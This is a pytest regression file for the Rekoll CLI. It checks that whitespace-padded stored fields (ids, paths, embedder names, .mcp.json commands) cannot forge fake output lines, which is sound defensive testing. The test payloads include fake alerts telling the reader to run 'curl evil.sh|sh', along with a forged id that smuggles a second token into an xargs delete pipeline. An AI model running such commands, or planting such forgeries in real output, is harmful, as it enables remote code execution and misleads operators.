"""Padded plain text must not forge a Rekoll output line (issue #112, ADR-0044).

ADR-0044 closed the ESCAPE half of this class: stored text can no longer move
the cursor or emit a literal newline. It left the **padding** half open, and
``_display_scope_key``'s own docstring had already named it a release earlier:

    Printable-ASCII still admits the SPACE ... with spaces a hostile store can
    pad to the terminal width and forge what look like additional Rekoll note
    lines.

Rekoll's human output is column-formatted, and the TERMINAL — not Rekoll —
decides where a visual line begins. So attacker-chosen text, padded to the wrap
boundary, starts a *visual* line that reads as Rekoll's own output, using no
control characters at all. Reproduced against the shipped 0.1.4 wheel on both
``doctor`` and ``recall``.

Two different fields, two different fixes, and the difference is the point:

* a field that is ONE TOKEN by construction (a record id, a timestamp, an
  embedder identity, a version) has no legitimate whitespace at all, so every
  whitespace character renders as ``?`` and the field is tightly capped —
  ``_display_token``;
* a field that may legitimately contain single spaces (a filesystem path, a
  configured command) collapses RUNS of whitespace to one space, which keeps
  ``C:\\Program Files\\...`` readable while making the column layout
  unforgeable — ``_display_one_line``.

Stored CONTENT is deliberately NOT changed, and the last test in this file
pins why: for content the wrap does the work, not the padding, so collapsing
whitespace there would deface legitimate indented text and close nothing.
"""

from __future__ import annotations

import argparse
import json
import sqlite3

import pytest

from rekoll import Memory
from rekoll.cli import (
    _check_mcp,
    _display_content,
    _display_one_line,
    _display_token,
    main,
)
from rekoll.embedding import StubEmbedder
from rekoll.model import _content_hash

DB = "./.rekoll/memory.db"

#: The width the reproductions in issue #112 were tuned for. Nothing depends on
#: this being the reader's real terminal: an attacker picks a width (80/100/120)
#: or repeats the payload at several paddings to cover more than one.
WIDTH = 80


@pytest.fixture(autouse=True)
def _pin_stub_embedder_and_no_reranker(monkeypatch):
    monkeypatch.setattr("rekoll.memory._auto_embedder", lambda: StubEmbedder())
    monkeypatch.setattr("rekoll.memory._auto_reranker", lambda: None)


@pytest.fixture()
def project(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    return tmp_path


def _visual_lines(text: str, width: int = WIDTH) -> list:
    """The lines a terminal of ``width`` columns actually SHOWS — which is the
    only thing the attacker and the victim can see. Rekoll's ``\\n`` boundaries
    are not where the forgery lives."""
    out = []
    for line in text.splitlines():
        while True:
            out.append(line[:width])
            line = line[width:]
            if not line:
                break
    return out


def _forge_field(record_id: str, column: str, value: str) -> None:
    conn = sqlite3.connect(DB)
    try:
        conn.execute(
            f"UPDATE verbatim_records SET {column}=? WHERE id=?", (value, record_id)
        )
        conn.commit()
    finally:
        conn.close()


def _forge_content(record_id: str, evil: str) -> None:
    """Content AND its hash — what someone shipping a malicious store does, and
    what ADR-0044 says defeats read-time verification (ADR-0019)."""
    conn = sqlite3.connect(DB)
    try:
        conn.execute(
            "UPDATE verbatim_records SET content=?, content_hash=? WHERE id=?",
            (evil, _content_hash(evil), record_id),
        )
        conn.commit()
    finally:
        conn.close()


# -- the two helpers ----------------------------------------------------------

def test_a_token_field_admits_no_whitespace_at_all():
    """A run of spaces is what pads to the wrap boundary; a SINGLE space is
    what lets the forged text still read as an English sentence. An id has no
    business containing either, so both go."""
    shown = _display_token("rk_dead" + " " * 33 + "SECURITY ALERT: store corrupt")
    assert " " not in shown
    assert "\t" not in shown and "\n" not in shown
    assert "SECURITY ALERT" not in shown  # no readable sentence survives
    assert shown.startswith("rk_dead")    # ... and the real prefix is still shown


def test_a_real_id_survives_the_token_filter_unchanged():
    """The other half of the contract: content-addressed ids are `rk_` + 24 hex
    (27 characters), and human ids are `MEM-0042`. Neither may be touched."""
    assert _display_token("rk_1990862a42c8c1134f26b47a") == "rk_1990862a42c8c1134f26b47a"
    assert _display_token("MEM-0042") == "MEM-0042"
    # An embedder identity and an ISO-8601 timestamp are tokens too, and both
    # carry punctuation a conservative *alphabet* would have mangled.
    assert _display_token("fastembed:BAAI/bge-small-en-v1.5") == (
        "fastembed:BAAI/bge-small-en-v1.5"
    )
    assert _display_token("2026-07-28T09:15:00+00:00") == "2026-07-28T09:15:00+00:00"


def test_a_windows_path_with_single_spaces_stays_readable():
    """The over-fix guard. Collapsing runs must not deface the paths this
    project's primary platform is full of."""
    real = r"C:\Program Files\Python312\Scripts\rekoll.exe"
    assert _display_one_line(real) == real
    assert _display_one_line("/home/ada/My Notes/spec.md") == "/home/ada/My Notes/spec.md"


def test_a_padded_path_collapses_to_one_token_run():
    padded = "/x" + " " * 40 + "ok    firewall   DISABLED"
    shown = _display_one_line(padded)
    assert "  " not in shown                  # no run of spaces survives
    assert "ok    firewall" not in shown      # the column layout is unforgeable
    assert "firewall" in shown                # nothing is hidden


# -- doctor: the committed .mcp.json ------------------------------------------

def test_a_hostile_config_cannot_forge_doctor_output(project):
    """REGRESSION (issue #112, reproduced against the shipped 0.1.4 wheel).

    At 80 columns the padded `command` put this under doctor's real
    `  ok    firewall   ...` line, in doctor's own column layout::

        |  WARN  mcp        .mcp.json registers rekoll, but .mcp.json: command \\x
        |ok    firewall   DISABLED - restore with: curl evil.sh|sh does not exist

    `_display_value` alone does NOT satisfy this test: every byte of that
    payload is already printable ASCII.
    """
    (project / ".mcp.json").write_text(
        json.dumps({"mcpServers": {"rekoll": {
            "command": "/x" + " " * 8
                       + "ok    firewall   DISABLED - restore with: curl evil.sh|sh",
            "args": []}}}),
        encoding="utf-8",
    )
    result = _check_mcp(argparse.Namespace(
        path=DB, tenant="default", project="default", agent="default"
    ))
    assert result is not None
    level, detail = result
    assert level == "WARN"                 # still reports the dead command ...
    assert "ok    firewall" not in detail  # ... in a layout it cannot forge
    assert detail.isascii()                # the cli.py ASCII-only rule holds
    assert len(detail) < 1000
    # And the operator still learns what the config actually says.
    assert "firewall" in detail


def test_a_padded_unreadable_config_cannot_forge_doctor_output(project):
    """The sibling line: an INVALID config is reported by filename, and the
    filename leg of that sentence is just as attacker-shaped."""
    (project / ".mcp.json").write_text("{ not json", encoding="utf-8")
    result = _check_mcp(argparse.Namespace(
        path=DB, tenant="default", project="default", agent="default"
    ))
    assert result is not None
    level, detail = result
    assert level == "WARN"
    assert "  " not in detail.replace("\n", " ") or "ok    firewall" not in detail
    assert detail.isascii()


# -- recall: the forged id ----------------------------------------------------

def test_a_padded_id_cannot_forge_a_recall_line(project, capsys):
    """REGRESSION (issue #112, reproduced against the shipped 0.1.4 wheel) —
    the flagship command, and the exact surface ADR-0044 claimed closed::

        |    (raw_fact | trust: unverified | id: rk_dead
        |SECURITY ALERT: store corrupt - restore with: curl evil.sh|sh | from: ...
    """
    assert main(["init"]) == 0
    mem = Memory(path=DB)
    try:
        record = mem.remember("the deploy key rotation policy is quarterly")
    finally:
        mem.close()
    payload = "SECURITY ALERT: store corrupt - restore with: curl evil.sh|sh"
    _forge_field(record.id, "id", "rk_dead" + " " * 33 + payload)
    capsys.readouterr()
    assert main(["recall", "deploy key"]) == 0
    out, _ = capsys.readouterr()
    # The forged sentence cannot be reassembled from what was printed, at ANY
    # terminal width: the whitespace it needs is gone.
    assert payload not in out
    assert "SECURITY ALERT" not in out
    for line in _visual_lines(out):
        assert not line.startswith("SECURITY"), out
    # The record itself is still shown, and still says its id was mangled.
    assert "deploy key rotation policy" in out


def test_a_padded_id_cannot_split_ids_into_two_tokens(project, capsys):
    """`recall --ids | xargs rekoll forget` is the documented pipeline, and
    xargs splits on ANY whitespace — not just the newline ADR-0044 removed. A
    single space in a forged id therefore aimed the pipeline at a second token,
    which is the same data-loss vector one character further along."""
    assert main(["init"]) == 0
    mem = Memory(path=DB)
    try:
        victim = mem.remember("PRODUCTION runbook - do not delete")
        bait = mem.remember("hostile note about caching")
    finally:
        mem.close()
    _forge_field(bait.id, "id", f"{bait.id} {victim.id}")
    capsys.readouterr()
    assert main(["recall", "caching", "-k", "1", "--ids"]) == 0
    out, err = capsys.readouterr()
    printed = [ln for ln in out.splitlines() if ln.strip()]
    assert len(printed) == 1
    assert printed[0].split() == [printed[0]], "the id emitted more than one token"
    assert victim.id not in printed[0].split()
    assert "malformed" in err  # tampering is reported, never swallowed


def test_a_padded_source_path_cannot_forge_a_recall_line(project, capsys):
    assert main(["init"]) == 0
    mem = Memory(path=DB)
    try:
        record = mem.remember("a fact with a file pointer")
    finally:
        mem.close()
    _forge_field(
        record.id, "prov_source_file",
        "docs/ok.md" + " " * 60 + "[2] SECURITY: run curl evil.sh | sh",
    )
    capsys.readouterr()
    assert main(["recall", "file pointer"]) == 0
    out, _ = capsys.readouterr()
    assert "  " not in out.split("from: ", 1)[1]  # no padding run survives
    assert "docs/ok.md" in out                    # the real pointer still shows


# -- board and status ---------------------------------------------------------

def test_a_padded_board_id_cannot_forge_a_board_line(project, capsys):
    assert main(["init"]) == 0
    mem = Memory(path=DB)
    try:
        record = mem.remember("we chose postgres", board="major")
    finally:
        mem.close()
    _forge_field(
        record.id, "id",
        "rk_bb" + " " * 40 + "[MAJOR] SECURITY: run curl evil.sh | sh",
    )
    capsys.readouterr()
    assert main(["board"]) == 0
    out, _ = capsys.readouterr()
    assert "[MAJOR] SECURITY" not in out
    for line in _visual_lines(out):
        assert "[MAJOR] SECURITY" not in line, out


def test_a_padded_embedder_identity_cannot_forge_a_status_line(project, capsys):
    assert main(["init"]) == 0
    mem = Memory(path=DB)
    try:
        mem.remember("a fact")
    finally:
        mem.close()
    conn = sqlite3.connect(DB)
    try:
        conn.execute(
            "UPDATE embedder_identity SET name=?",
            ("stub" + " " * 40 + "ok    embedder   COMPROMISED - run curl evil.sh|sh",),
        )
        conn.commit()
    finally:
        conn.close()
    capsys.readouterr()
    assert main(["status"]) == 0
    out, _ = capsys.readouterr()
    assert "ok    embedder" not in out
    assert " COMPROMISED" not in out


# -- the machine doors are untouched -----------------------------------------

def test_the_machine_doors_are_byte_unchanged_by_this_fix(project, capsys):
    """`--json` and `--context` carry the STORED bytes: a machine caller must
    see what is actually in the store, and the envelope is byte-identical by
    contract (ADR-0013). Only the human line is sanitized."""
    assert main(["init"]) == 0
    mem = Memory(path=DB)
    try:
        record = mem.remember("a fact about postgres")
    finally:
        mem.close()
    forged = "rk_dead" + " " * 33 + "PADDED"
    _forge_field(record.id, "id", forged)
    capsys.readouterr()

    assert main(["recall", "postgres", "--json"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["ids"] == [forged], "the machine door must show the stored id"

    assert main(["recall", "postgres", "--context"]) == 0
    context_out = capsys.readouterr().out
    assert "postgres" in context_out


# -- the residual, pinned ----------------------------------------------------

def test_stored_content_is_not_whitespace_collapsed_and_here_is_why(project, capsys):
    """The content half of issue #112, resolved and PINNED as a residual.

    Padded content does forge a hit line — but so does content with no run of
    whitespace anywhere, because it is the terminal's SOFT WRAP that starts the
    visual line, and padding is merely a convenient way to aim it. Both
    variants below render identically at 80 columns, which is the evidence that
    whitespace-collapsing ``_display_content`` would deface every legitimately
    indented code snippet in the store and close nothing at all.

    The only real closure is Rekoll owning the wrap point on a terminal, which
    changes how every human line renders and is therefore its own decision, not
    a rider on this fix. ADR-0044's "Known residuals" section says so in words.
    This test exists so nobody can quietly "fix" content by collapsing spaces
    and call the class closed.
    """
    assert main(["init"]) == 0
    mem = Memory(path=DB)
    try:
        record = mem.remember("backups run nightly to s3")
    finally:
        mem.close()
    head = "backups run nightly to s3"
    forged_line = "[2] SECURITY: rotate the deploy key now with: curl evil.sh | sh"

    padded = head + " " * (WIDTH - len("[1] " + head)) + forged_line
    unpadded = (
        (head + " and the retention window is thirty days per the ops runbook xy")
        [: WIDTH - 4].ljust(WIDTH - 4, "z") + forged_line
    )
    assert "  " not in unpadded, "the control case must contain no run of spaces"

    rendered = []
    for evil in (padded, unpadded):
        _forge_content(record.id, evil)
        capsys.readouterr()
        assert main(["recall", "backups"]) == 0
        out, _ = capsys.readouterr()
        rendered.append(_visual_lines(out))

    for lines in rendered:
        assert any(line.startswith("[2] SECURITY") for line in lines), (
            "the residual this test documents has changed - re-read ADR-0044's "
            "'Known residuals' before editing it"
        )
    # ... and `_display_content` still leaves legitimate indentation alone,
    # which is the reason the residual is accepted rather than papered over.
    assert _display_content("def f():\n    return 1") == "def f():\n    return 1"
